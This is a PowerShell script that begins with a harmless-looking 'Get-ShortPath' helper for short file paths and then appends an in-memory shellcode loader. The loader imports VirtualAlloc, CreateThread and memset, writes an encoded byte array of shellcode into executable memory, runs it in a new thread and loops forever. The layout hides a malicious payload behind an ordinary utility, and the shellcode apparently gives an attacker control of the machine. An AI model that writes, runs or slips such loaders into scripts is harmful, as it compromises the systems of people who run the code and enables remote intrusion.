filter Get-ShortPath {
    param (
        [Parameter(ValueFromPipeline=$true)]
        [string]$obj
    )

    begin {
        $fso = New-Object -ComObject Scripting.FileSystemObject
        function Release-Ref ($ref) {
            ([System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$ref) -gt 0)
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
    }

    process {
        if (!$obj) {$obj = $pwd}

        $file = gi $obj
        if ($file.psiscontainer) {
            $fso.getfolder($file.fullname).ShortPath
        } else {
            $fso.getfile($file.fullname).ShortPath
        }
    }

    end {
        $null = Release-Ref $fso
    }
}

$fVQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fVQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcc,0xbe,0x86,0x4b,0x04,0xbf,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x18,0x83,0xc0,0x04,0x03,0x70,0x92,0xa9,0xf1,0x43,0x72,0xaf,0xfa,0xbb,0x82,0xd0,0x73,0x5e,0xb3,0xd0,0xe0,0x2a,0xe3,0xe0,0x63,0x7e,0x0f,0x8a,0x26,0x6b,0x84,0xfe,0xee,0x9c,0x2d,0xb4,0xc8,0x93,0xae,0xe5,0x29,0xb5,0x2c,0xf4,0x7d,0x15,0x0d,0x37,0x70,0x54,0x4a,0x2a,0x79,0x04,0x03,0x20,0x2c,0xb9,0x20,0x7c,0xed,0x32,0x7a,0x90,0x75,0xa6,0xca,0x93,0x54,0x79,0x41,0xca,0x76,0x7b,0x86,0x66,0x3f,0x63,0xcb,0x43,0x89,0x18,0x3f,0x3f,0x08,0xc9,0x0e,0xc0,0xa7,0x34,0xbf,0x33,0xb9,0x71,0x07,0xac,0xcc,0x8b,0x74,0x51,0xd7,0x4f,0x07,0x8d,0x52,0x54,0xaf,0x46,0xc4,0xb0,0x4e,0x8a,0x93,0x33,0x5c,0x67,0xd7,0x1c,0x40,0x76,0x34,0x17,0x7c,0xf3,0xbb,0xf8,0xf5,0x47,0x98,0xdc,0x5e,0x13,0x81,0x45,0x3a,0xf2,0xbe,0x96,0xe5,0xab,0x1a,0xdc,0x0b,0xbf,0x16,0xbf,0x43,0x0c,0x1b,0x40,0x93,0x1a,0x2c,0x33,0xa1,0x85,0x86,0xdb,0x89,0x4e,0x01,0x1b,0xee,0x64,0xf5,0xb3,0x11,0x87,0x06,0x9d,0xd5,0xd3,0x56,0xb5,0xfc,0x5b,0x3d,0x45,0x01,0x8e,0xa8,0x40,0x95,0x6e,0xda,0x36,0x91,0xf9,0x26,0xc9,0x48,0xa6,0xaf,0x2f,0x3a,0x06,0xe0,0xff,0xfa,0xf6,0x40,0x50,0x92,0x1c,0x4f,0x8f,0x82,0x1e,0x85,0xb8,0x28,0xf1,0x70,0x90,0xc4,0x68,0xd9,0x6a,0x75,0x74,0xf7,0x16,0xb5,0xfe,0xf4,0xe7,0x7b,0xf7,0x71,0xf4,0xeb,0xf7,0xcf,0xa6,0xbd,0x08,0xfa,0xcd,0x41,0x9d,0x01,0x44,0x16,0x09,0x08,0xb1,0x50,0x96,0xf3,0x94,0xeb,0x1f,0x66,0x57,0x83,0x5f,0x66,0x57,0x53,0x36,0xec,0x57,0x3b,0xee,0x54,0x04,0x5e,0xf1,0x40,0x38,0xf3,0x64,0x6b,0x69,0xa0,0x2f,0x03,0x97,0x9f,0x18,0x8c,0x68,0xca,0x98,0xf0,0xbe,0x32,0xef,0x18,0x03;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pxl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pxl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pxl,0,0,0);for (;;){Start-sleep 60};
